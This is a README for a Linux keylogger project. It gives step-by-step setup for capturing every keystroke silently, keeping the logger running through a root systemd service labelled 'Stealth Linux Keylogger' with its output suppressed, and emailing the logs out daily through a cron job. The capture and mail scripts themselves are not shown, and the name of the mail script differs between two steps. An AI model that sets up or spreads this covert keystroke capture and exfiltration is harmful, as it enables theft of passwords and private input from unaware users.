# Linux Based Persistent Keylogger with mailing
This is a Linux based keylogger which starts at startup and runs in the background. Saves the output of every key stroke in a file and mails the file automatically in every 24 hours cycle to the admin.

## Project Structure
```
  /usr/local/bin/
 ├── keylogger.sh          # Main keylogger script (background)
 ├── mail_keylog.sh        # Email script (sends logs daily)
  /etc/systemd/system/
 ├── keylogger.service     # Systemd service for persistence
  /var/log/keylogger/      # Directory storing keystroke logs
```
## Features
1. Runs in the background silently
2. Logs all keystrokes into a file (/var/log/keylogger/YYYY-MM-DD.log)
3. Persists after reboot (via systemd service)
4. Sends daily logs to admin via email (via cron job)
5. Auto-restarts if stopped

## Installation & Setup
1. Install Dependencies
   ```
   - sudo apt update && sudo apt install evtest mailutils -y  #Debian
   - sudo yum install evtest mailx -y #RHEL
   ```
3. Identify the Keyboard Device
   ```
   - sudo evtest
   ```
      - Then check for the keyboard device #Example: /dev/input/event1:	AT Translated Set 2 keyboard
         - Press keys to check response. Once identified, update /dev/input/eventX in the script.

## Keylogger Script
1. Create the script here: ``` sudo nano /usr/local/bin/keylogger.sh ```
2. Then make it executable with: ``` chmod +x /usr/local/bin/keylogger.sh ```

## Making the Keylogger Persistent
1. Create a systemd service
   ```
   - sudo nano /etc/systemd/system/keylogger.service
   ```
2. Paste the following:
 ```
[Unit]
Description=Stealth Linux Keylogger
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/keylogger.sh
Restart=always
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```
3. Enable and start the service
   ```
    - sudo systemctl daemon-reload
    - sudo systemctl enable keylogger
    - sudo systemctl start keylogger
   ```
4. Verify if its running
   ```
   sudo systemctl status keylogger
   ```

## Emailing the logs every 24 hours with cron jobs
1. Create the email script
   ```
   sudo nano /usr/local/bin/mail_keylog.sh
   ```
2. Make it executable
   ```
   sudo chmod +x /usr/local/bin/send_keylog.sh
   ```
3. Schedule the cron job daily at midnight
   ```
   sudo crontab -e
   ```
   Then add the following
   ```
   0 0 * * * /usr/local/bin/mail_keylog.sh
   ```
4. Restart cron service
   ```
   sudo systemctl restart cron
   ```

